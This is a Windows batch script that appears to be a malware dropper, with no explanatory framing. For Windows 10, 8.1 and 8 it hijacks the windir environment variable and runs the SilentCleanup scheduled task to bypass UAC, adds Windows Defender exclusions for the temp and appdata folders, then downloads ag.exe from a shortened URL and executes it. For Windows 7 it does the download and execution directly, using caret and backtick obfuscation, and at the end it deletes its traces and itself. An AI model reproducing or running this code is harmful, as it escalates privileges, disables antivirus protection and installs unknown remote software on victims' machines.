mode 18,1
color FE
setlocal
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" ( echo "Windows 10 detected" 
reg add "HKCU\Environment" /v "windir" /d "cmd /c start p^owersh^el^l -w 1 Add-MpPreference -ExclusionPath "$env:temp" ;Add-MpPreference -ExclusionPath "$env:appdata" ;Start-Sleep 12; (New-Object Net.WebClient).DownloadFile('https://cutt.ly/Nhm2Iap',($env:temp)+'\ag.exe');Start-Sleep 2; Start-Process $env:temp\ag.exe;&REM " >nul
timeout /t 2 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
)
if "%version%" == "6.3" ( echo "Windows 8.1 detected" 
reg add "HKCU\Environment" /v "windir" /d "cmd /c start p^owersh^el^l -w 1 Add-MpPreference -ExclusionPath "$env:temp" ;Add-MpPreference -ExclusionPath "$env:appdata" ;Start-Sleep 12; (New-Object Net.WebClient).DownloadFile('https://cutt.ly/Nhm2Iap',($env:temp)+'\ag.exe');Start-Sleep 2; Start-Process $env:temp\ag.exe;&REM " >nul
timeout /t 2 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
)
if "%version%" == "6.2" ( echo "Windows 8 detected" 
reg add "HKCU\Environment" /v "windir" /d "cmd /c start p^owersh^el^l -w 1 Add-MpPreference -ExclusionPath "$env:temp" ;Add-MpPreference -ExclusionPath "$env:appdata" ;Start-Sleep 12; (New-Object Net.WebClient).DownloadFile('https://cutt.ly/Nhm2Iap',($env:temp)+'\ag.exe');Start-Sleep 2; Start-Process $env:temp\ag.exe;&REM " >nul
timeout /t 2 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
)
if "%version%" == "6.1" (
Cmd /c " p^owersh^el^l -w 1 (nEw-oBje`cT Net.WebcL`IENt).('DownloadFile').Invoke('https://cutt.ly/Nhm2Iap',($env:temp)+'\ag.exe');Start-Sleep 2; Start-Process $env:temp\ag.exe;"
)
endlocal
del pd.bat
exitexit
